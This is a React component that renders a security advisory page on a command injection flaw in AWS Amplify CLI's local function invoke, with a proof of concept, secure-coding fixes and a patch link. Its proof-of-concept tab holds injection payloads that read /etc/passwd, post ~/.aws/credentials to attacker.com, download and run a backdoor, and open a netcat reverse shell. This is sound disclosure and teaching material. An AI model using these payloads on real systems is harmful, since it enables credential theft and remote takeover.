import React, { useState } from 'react';
import { Shield, Terminal, AlertTriangle, CheckCircle, BookOpen, Code, Link2, FileCode, ArrowRight } from 'lucide-react';

interface CodeBlockProps {
  language: string;
  code: string;
}

const CodeBlock: React.FC<CodeBlockProps> = ({ language, code }) => {
  return (
    <div className="relative group">
      <div className="absolute -top-3 right-2 px-2 py-1 bg-gray-700 text-xs text-gray-300 rounded">
        {language}
      </div>
      <pre className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto font-mono text-sm">
        <code>{code}</code>
      </pre>
    </div>
  );
};

const WriteupBlog: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'overview' | 'technical' | 'impact' | 'poc'>('overview');

  return (
    <section id="writeup" className="py-16 bg-gray-50 dark:bg-gray-800/50">
      <div className="container mx-auto px-4 sm:px-6 lg:px-8">
        <div className="max-w-4xl mx-auto">
          {/* Header */}
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold mb-4">
              <span className="inline-block relative">
                Security Research & Writeups
                <span className="absolute bottom-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-400 to-blue-500"></span>
              </span>
            </h2>
            <p className="text-gray-600 dark:text-gray-400">
              Detailed analysis and documentation of discovered vulnerabilities
            </p>
          </div>

          {/* Featured Report Card */}
          <div className="bg-white dark:bg-gray-900 rounded-xl shadow-xl overflow-hidden mb-12">
            <div className="bg-gradient-to-r from-cyan-500 to-blue-500 p-6">
              <div className="flex items-center space-x-2 text-white mb-4">
                <Shield className="h-6 w-6" />
                <span className="text-sm font-medium">Security Advisory</span>
              </div>
              <h3 className="text-2xl font-bold text-white mb-2">
                Command Injection Vulnerability in AWS Amplify CLI
              </h3>
              <p className="text-white/80">
                Critical security flaw discovered in AWS Amplify CLI allowing arbitrary command execution
              </p>
            </div>

            {/* Navigation Tabs */}
            <div className="border-b border-gray-200 dark:border-gray-700">
              <nav className="flex -mb-px">
                {[
                  { id: 'overview', label: 'Overview', icon: BookOpen },
                  { id: 'technical', label: 'Technical Details', icon: FileCode },
                  { id: 'impact', label: 'Impact', icon: AlertTriangle },
                  { id: 'poc', label: 'Proof of Concept', icon: Terminal }
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id as any)}
                    className={`flex-1 px-4 py-4 text-center border-b-2 transition-colors ${
                      activeTab === tab.id
                        ? 'border-cyan-500 text-cyan-500'
                        : 'border-transparent text-gray-500 hover:text-gray-700 dark:hover:text-gray-300'
                    }`}
                  >
                    <div className="flex items-center justify-center space-x-2">
                      <tab.icon className="h-5 w-5" />
                      <span className="font-medium">{tab.label}</span>
                    </div>
                  </button>
                ))}
              </nav>
            </div>

            {/* Content Sections */}
            <div className="p-6">
              {activeTab === 'overview' && (
                <div className="space-y-6">
                  <div className="bg-cyan-50 dark:bg-cyan-900/20 p-4 rounded-lg">
                    <h4 className="text-lg font-bold text-cyan-700 dark:text-cyan-300 mb-2">
                      Vulnerability Summary
                    </h4>
                    <p className="text-gray-600 dark:text-gray-400">
                      A critical command injection vulnerability was discovered in the AWS Amplify CLI's
                      function runtime provider. This security flaw could allow attackers to execute
                      arbitrary system commands through malicious input manipulation.
                    </p>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="border dark:border-gray-700 p-4 rounded-lg">
                      <h5 className="font-bold mb-2">Affected Component</h5>
                      <p className="text-gray-600 dark:text-gray-400">
                        AWS Amplify CLI - localinvoke.ts
                      </p>
                    </div>
                    <div className="border dark:border-gray-700 p-4 rounded-lg">
                      <h5 className="font-bold mb-2">Severity</h5>
                      <span className="px-2 py-1 bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-300 rounded">
                        Critical
                      </span>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'technical' && (
                <div className="space-y-6">
                  <div className="prose dark:prose-invert max-w-none">
                    <h4 className="text-lg font-bold mb-4">Vulnerability Details</h4>
                    <p>
                      The vulnerability exists in the function runtime provider's local invoke functionality.
                      The issue stems from improper handling of user input when executing shell commands:
                    </p>
                  </div>

                  <CodeBlock
                    language="typescript"
                    code={`await execa.command(\`./$\{lambdaExecutablePath\}\`, {
  cwd: lambdaExecutableDir,
  stdio: 'inherit',
});`}
                  />

                  <div className="bg-yellow-50 dark:bg-yellow-900/20 p-4 rounded-lg">
                    <h5 className="font-bold text-yellow-700 dark:text-yellow-300 mb-2">
                      Security Issue
                    </h5>
                    <ul className="list-disc list-inside space-y-2 text-gray-600 dark:text-gray-400">
                      <li>Direct interpolation of user input into shell commands</li>
                      <li>No input validation or sanitization</li>
                      <li>Use of shell-enabled command execution</li>
                    </ul>
                  </div>
                </div>
              )}

              {activeTab === 'impact' && (
                <div className="space-y-6">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="bg-red-50 dark:bg-red-900/20 p-4 rounded-lg">
                      <AlertTriangle className="h-8 w-8 text-red-500 mb-2" />
                      <h4 className="font-bold mb-2">Attack Vector</h4>
                      <ul className="list-disc list-inside space-y-1 text-gray-600 dark:text-gray-400">
                        <li>Malicious function input</li>
                        <li>Command injection payloads</li>
                        <li>Shell metacharacter abuse</li>
                      </ul>
                    </div>
                    <div className="bg-orange-50 dark:bg-orange-900/20 p-4 rounded-lg">
                      <Shield className="h-8 w-8 text-orange-500 mb-2" />
                      <h4 className="font-bold mb-2">Potential Impact</h4>
                      <ul className="list-disc list-inside space-y-1 text-gray-600 dark:text-gray-400">
                        <li>Remote code execution</li>
                        <li>Data exfiltration</li>
                        <li>System compromise</li>
                      </ul>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'poc' && (
                <div className="space-y-8">
                  <div className="prose dark:prose-invert max-w-none">
                    <h4 className="text-lg font-bold mb-4">Detailed Proof of Concept</h4>
                    <p>
                      This comprehensive proof of concept demonstrates the command injection vulnerability
                      in the AWS Amplify CLI. Follow these steps to reproduce the issue:
                    </p>
                  </div>

                  {/* Step 1: Basic Vulnerability Demonstration */}
                  <div className="bg-gray-50 dark:bg-gray-800/50 p-6 rounded-lg space-y-4">
                    <h5 className="font-bold text-lg flex items-center">
                      <span className="w-8 h-8 rounded-full bg-cyan-500 text-white flex items-center justify-center mr-3">1</span>
                      Basic Vulnerability Demonstration
                    </h5>
                    <p className="text-gray-600 dark:text-gray-400">
                      First, let's demonstrate the vulnerability with a simple Node.js script that simulates the issue:
                    </p>
                    <CodeBlock
                      language="javascript"
                      code={`const execa = require("execa");

function runCommand(inputPath) {
  const command = \`./$\{inputPath\}\`;
  console.log("[!] Executing:", command);
  execa.command(command, { stdio: 'inherit' })
    .then(() => console.log("[+] Done"))
    .catch(err => console.error("[x] Error:", err.message));
}

// Malicious payload using command injection
const payload = 'somefile; echo HACKED > /tmp/hacked.txt';
runCommand(payload);`}
                    />
                  </div>

                  {/* Step 2: AWS Amplify CLI Exploitation */}
                  <div className="bg-gray-50 dark:bg-gray-800/50 p-6 rounded-lg space-y-4">
                    <h5 className="font-bold text-lg flex items-center">
                      <span className="w-8 h-8 rounded-full bg-cyan-500 text-white flex items-center justify-center mr-3">2</span>
                      AWS Amplify CLI Exploitation
                    </h5>
                    <p className="text-gray-600 dark:text-gray-400">
                      Now, let's exploit the actual vulnerability in AWS Amplify CLI:
                    </p>
                    <div className="space-y-4">
                      <div>
                        <h6 className="font-semibold mb-2">2.1. Create a malicious Lambda function:</h6>
                        <CodeBlock
                          language="bash"
                          code={`amplify add function

? Select which capability you want to add: Lambda function
? Provide an AWS Lambda function name: maliciousFunction
? Choose the runtime that you want to use: Go
...`}
                        />
                      </div>
                      <div>
                        <h6 className="font-semibold mb-2">2.2. Prepare the payload:</h6>
                        <CodeBlock
                          language="bash"
                          code={`--lambdaExecutablePath="echo pwned; cat /etc/passwd"`}
                        />
                      </div>
                      <div>
                        <h6 className="font-semibold mb-2">2.3. Execute the exploit:</h6>
                        <CodeBlock
                          language="bash"
                          code={`amplify function invoke maliciousFunction`}
                        />
                      </div>
                    </div>
                  </div>

                  {/* Step 3: Alternative Attack Vectors */}
                  <div className="bg-gray-50 dark:bg-gray-800/50 p-6 rounded-lg space-y-4">
                    <h5 className="font-bold text-lg flex items-center">
                      <span className="w-8 h-8 rounded-full bg-cyan-500 text-white flex items-center justify-center mr-3">3</span>
                      Alternative Attack Vectors
                    </h5>
                    <p className="text-gray-600 dark:text-gray-400">
                      The vulnerability can be exploited in multiple ways. Here's an example using shell metacharacters:
                    </p>
                    <CodeBlock
                      language="typescript"
                      code={`// Example 1: Using semicolon
const payload1 = "main; curl -X POST http://attacker.com/exfil --data \\"$(cat ~/.aws/credentials)\\"";

// Example 2: Using backticks
const payload2 = "main \`curl http://attacker.com/backdoor -o /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor\`";

// Example 3: Using pipes
const payload3 = "main | nc attacker.com 4444 -e /bin/sh";`}
                    />
                  </div>

                  {/* Step 4: Secure Implementation */}
                  <div className="bg-green-50 dark:bg-green-900/20 p-6 rounded-lg space-y-4">
                    <h5 className="font-bold text-lg flex items-center">
                      <span className="w-8 h-8 rounded-full bg-green-500 text-white flex items-center justify-center mr-3">4</span>
                      Secure Implementation
                    </h5>
                    <p className="text-gray-600 dark:text-gray-400">
                      Here's how to properly implement the functionality to prevent command injection:
                    </p>
                    <CodeBlock
                      language="typescript"
                      code={`// Safe: Using execFile
const cp = require("child_process");
cp.execFile("./binary", ["--flag", "value"], callback);

// Safe: Using execa with array arguments
const execa = require("execa");
await execa("./binary", ["--flag", "value"]);

// Safe: Using shell-quote for shell commands
const shellQuote = require("shell-quote");
cp.exec("wget " + shellQuote.quote([userInput]) + " | wc -l", callback);`}
                    />
                  </div>
                </div>
              )}
            </div>

            {/* Footer */}
            <div className="bg-gray-50 dark:bg-gray-800/50 p-6 mt-6">
              <div className="flex flex-wrap items-center justify-between gap-4">
                <div className="flex items-center space-x-4">
                  <Link2 className="h-5 w-5 text-gray-500" />
                  <a 
                    href="https://github.com/aws-amplify/amplify-cli/commit/c55512f15914856998b529bc72594f2c09e3852f"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-cyan-600 dark:text-cyan-400 hover:underline"
                  >
                    View Patch Details
                  </a>
                </div>
                <div className="flex items-center space-x-2">
                  <CheckCircle className="h-5 w-5 text-green-500" />
                  <span className="text-gray-600 dark:text-gray-400">Patched in commit c55512f</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default WriteupBlog;